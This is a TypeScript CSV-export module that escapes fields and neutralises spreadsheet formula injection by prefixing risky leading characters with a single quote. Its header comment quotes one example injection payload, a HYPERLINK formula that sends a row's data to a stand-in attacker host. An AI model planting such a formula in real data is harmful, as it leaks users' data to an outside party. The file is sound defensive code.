// src/lib/csv.ts
//
// CSV generation, with one deliberate piece of paranoia.
//
// FORMULA INJECTION. A CSV is usually opened in Excel or Sheets, and
// those treat a cell beginning with =, +, - or @ as a FORMULA rather
// than text. A technician note reading
//
//   =HYPERLINK("https://evil.example/"&A1,"Click for details")
//
// becomes a live link carrying a row of that tenant's data when someone
// opens the export. Every field in this system that a person can type
// into — technician notes, dispute text a CUSTOMER writes, profile
// names — can reach an export, so quoting alone is not enough: RFC 4180
// escaping produces a perfectly valid CSV that still executes.
//
// Any value starting with one of those characters is therefore prefixed
// with a single quote, which spreadsheets read as "treat this as text".
// The visible content is unchanged; only its interpretation is.

const RISKY_PREFIX = /^[=+\-@\t\r]/;

/** One field, escaped for RFC 4180 and defused for spreadsheets. */
export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return "";

  let text: string;
  if (value instanceof Date) text = value.toISOString();
  else if (typeof value === "object") text = JSON.stringify(value);
  else text = String(value);

  // Defuse BEFORE quoting: the prefix has to be inside the quoted field.
  if (RISKY_PREFIX.test(text)) text = `'${text}`;

  // Quote when the value contains a delimiter, a quote or a newline;
  // doubling any embedded quote, per RFC 4180.
  if (/[",\n\r]/.test(text)) return `"${text.replace(/"/g, '""')}"`;
  return text;
}

export function csvRow(cells: unknown[]): string {
  return cells.map(csvCell).join(",");
}

/**
 * A complete document. The BOM is deliberate: without it Excel on
 * Windows reads UTF-8 as the local codepage, and any non-ASCII
 * character in a device model or a customer's note arrives mangled.
 */
export function csvDocument(headers: string[], rows: unknown[][]): string {
  const lines = [csvRow(headers), ...rows.map(csvRow)];
  return `﻿${lines.join("\r\n")}\r\n`;
}

/** Content-Disposition with a dated filename, so a folder of exports
 *  stays distinguishable. */
export function csvFilename(base: string, now: Date): string {
  const stamp = now.toISOString().slice(0, 10);
  return `${base}-${stamp}.csv`;
}
